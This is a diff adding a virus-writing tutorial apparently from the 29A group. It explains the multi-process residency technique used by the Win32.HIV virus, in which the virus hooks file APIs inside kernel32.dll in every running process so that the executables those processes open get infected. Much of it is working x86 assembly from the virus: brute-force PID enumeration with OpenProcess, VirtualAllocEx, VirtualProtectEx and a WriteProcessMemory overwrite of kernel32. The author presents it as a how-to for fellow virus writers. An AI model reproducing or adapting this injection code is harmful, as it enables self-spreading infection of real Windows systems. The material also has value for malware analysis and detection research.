@@ -1,0 +1,198 @@
+
+                          ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿
+                          ³  Multi-process residency  ³
+                          ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ
+	                     ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿
+        	             ³    by Benny/29A    ³
+                	     ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ
+
+
+ ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿
+ ³ Introduction ³
+ ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ
+
+it's a long time when the first viruses became memory resident. while the time
+passed we, virus coderz, found new wayz how to become memory resident under
+Windows platformz. under Win95/98 it was very easy to jump to Ring-0, hook all
+file APIz and so stay resident. 100% Win32 compatible residency could be done
+by registry tricks or by hooking importz in Import Table of PEz (so called
+per-process residency).
+
+but to achieve "multi-process" residency - residency in all processes, not only
+in the current one is harder. I'll discuss here my method, which is implemented
+in Win32.HIV and is 100% API based. this virus can stay resident, not only by
+hooking current process'es APIz, but in all currently running processes.
+
+imagine this: you have opened cmd.exe application (command interpret) and
+accidentelly you'll execute such virus. from that time, all file operationz,
+even in cmd.exe process are hooked and every executable file opened by the
+application(z) will be infected. nice, eh?
+
+
+ ÚÄÄÄÄÄÄÄÄÄÄÄÄÄ¿
+ ³ Explanation ³
+ ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÙ
+
+this method is based on kernel32.dll infection algorithm. bad stuff is that it
+worx only on WinNT/2k machinez (becoz of using APIz to work with processes,
+which are not implemented in Win95/98). my idea is to hook some file APIz in
+already loaded kernel32.dll, in all currently running processes. how do I mean
+it? here is the scheme:
+
+---- operation in separated thread ----
+1*	create handle to process no.1
+2*	find the address of loaded kernel32.dll library
+3*	allocate memory in the victim process and copy there virus
+4*	copy k32 to our buffer and hook there all file APIz
+5*	unprotect kernel32.dll pages
+6*	overwrite kernel32.dll with the infected one (from the buffer)
+
+7*	create handle to process no.2
+8*	... etc ...
+
+
+1*,7*	I know two wayz how to create handle to any already running process.
+
+	I) first is by using legal APIz from the system:
+	-	EnumProcesses
+	-	OpenProcess
+
+	for detailed description how to work with these APIz look at GriYo's
+	"EXPLORER *in-memory* infection" article published in 29A#4.
+
+	II) second method is used by Win32.HIV. becoz every process has its own
+	ID number, valid in whole system, there's no problem to just randomly
+	select one small number (<4000), check if it's valid PID and if it is,
+	create the handle to it.
+
+	code from Win32.HIV:
+
+	xor	ebx,ebx				;EBX - PID
+	mov	ecx,80000h			;number of processes
+nextPID:inc	ebx				;increment PID
+	pushad					;store all registers
+	push	ebx				;Process ID
+	push	0				;no inheritance
+	push	PROCESS_VM_READ or PROCESS_VM_WRITE or PROCESS_VM_OPERATION or PROCESS_QUERY_INFORMATION
+						;try to get handle of process
+	call	[ebp + a_OpenProcess - gdelta]	;thru our ID                 
+	;if the PID is valid, we should have handle in EAX, otherwise EAX=0
+	test	eax,eax				;have we correct handle?
+	jne	gotPID				;yeah, ID is valid, infect process!
+pid_loop:
+	popad		   			;restore all registers
+	loop	nextPID				;nope, try it with another ID
+						;finished, quit
+
+
+2*	this is very easy. simply, kernel32.dll should be loaded in all
+	processes on the same address (I can't imagine the case when it should
+	not be so), so all you have to do is to find kernel32.dll's address in
+	your process.
+
+
+3*	there is VirtualAllocEx API for memory allocation in another process.
+	the function prototype is similar to VirtualAlloc API, with the one
+	exception - the first parameter is handle to process:
+
+	push	PAGE_EXECUTE_READWRITE
+	push	MEM_RESERVE or MEM_COMMIT
+	push	virus_size
+	push	0					;allocate enough space
+	push	ebx					;for virus code in
+	call	[ebp + a_VirtualAllocEx - gdelta]	;victim process
+	test	eax,eax
+	je	end_K32_dealloc				;quit if error
+	mov	[ebp + virus_base - gdelta],eax		;save the address
+
+
+4*	first what you have to do is to get the size of kernel32.dll. the code
+	from Win32.HIV follows:
+
+gotPID:	xchg	eax,ebx				;handle to EBX
+	mov	esi,12345678h			;get K32 base
+k32_base = dword ptr $-4
+
+	;Now we have to get the size of K32 in another process. We use the trick
+	;-> we will search thru the address space for the end of K32 in memory
+	;and then we will substract the value with the base address, so we will
+	;get the size
+start_parse:
+	push	mbi_size
+	lea	eax,[ebp + mbi - gdelta]	;MBI structure
+	push	eax
+	push	esi
+	push	ebx				;get informations about
+	call	[ebp + a_VirtualQueryEx - gdelta]
+	test	eax,eax				;adress space
+	je	end_K32_patching		;quit if error
+						;is memory commited?
+	test	dword ptr [ebp + reg_state - gdelta],MEM_COMMIT
+	je	end_parse			;quit if not, end of K32 found
+	mov	eax,[ebp + reg_size - gdelta]	;get size of region
+	add	[ebp + k32_size - gdelta],eax	;add the size to variable
+	add	esi,eax				;make new address
+	jmp	start_parse			;and parse again
+end_parse:
+	sub	esi,[ebp + k32_base - gdelta]	;correct to size and save it
+	mov	[ebp + k32_size - gdelta],esi	;(size=k32_end - k32_start)
+
+
+	in variable "k32_size" is now stored the size of kernel32.dll. next
+	step is to allocate memory for k32 (by VirtualAlloc) and hook all
+	file API functionz:
+
+	push	PAGE_READWRITE
+	push	MEM_RESERVE or MEM_COMMIT
+	push	esi
+	push	0
+	call	[ebp + a_VirtualAlloc - gdelta]	;allocate enough space
+	test	eax,eax				;for K32 in our process
+	je	end_K32_patching
+	xchg	eax,edi
+	mov	[ebp + k32_copy - gdelta],edi	;save the address
+
+
+5*	kernel32.dll's memory pages are protected, but you can easilly
+	unprotect them by VirtualProtectEx API. the code follows:
+
+	;now we will change protection of K32 memory so we will be able to
+	;overwrite it with infected version of K32
+	lea	edx,[ebp + tmp - gdelta]
+	push	edx
+	push	PAGE_EXECUTE_READWRITE
+	push	dword ptr [ebp + k32_size - gdelta]
+	push	dword ptr [ebp + k32_base - gdelta]
+	push	ebx
+	call	[ebp + a_VirtualProtectEx - gdelta]	;now we will be able to
+	dec	eax					;rewrite the K32 with
+	jne	end_K32_dealloc				;infected one
+
+
+6*	for overwriting data in another process you can use WriteProcessMemory:
+
+	lea	edx,[ebp + tmp - gdelta]
+	push	edx
+	push	dword ptr [ebp + k32_size - gdelta]
+	push	dword ptr [ebp + k32_copy - gdelta]
+	push	dword ptr [ebp + k32_base - gdelta]
+	push	ebx
+	call	[ebp + a_WriteProcessMemory - gdelta]	;rewrite K32
+
+
+ ÚÄÄÄÄÄÄÄÄÄ¿
+ ³ Closin' ³
+ ÀÄÄÄÄÄÄÄÄÄÙ
+
+woow! and the multi-process resident virus is finished. this method is not very
+difficult to realise, it is small and very efficent. and it worx. if you would
+like to get more informationz about this, or you will want anything else,
+contact me!
+
+
+
+                                                  ÚÄÄÄÄÄÄÄÄÄÄÄÄÄ¿
+                                                  # Benny / 29A ÀÄÄÄÄÄÄÄÄÄÄÄ¿
+                                                  @ benny_29a@privacyx.com  ³
+                                                  @ http://benny29a.cjb.net ³
+                                                  ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ
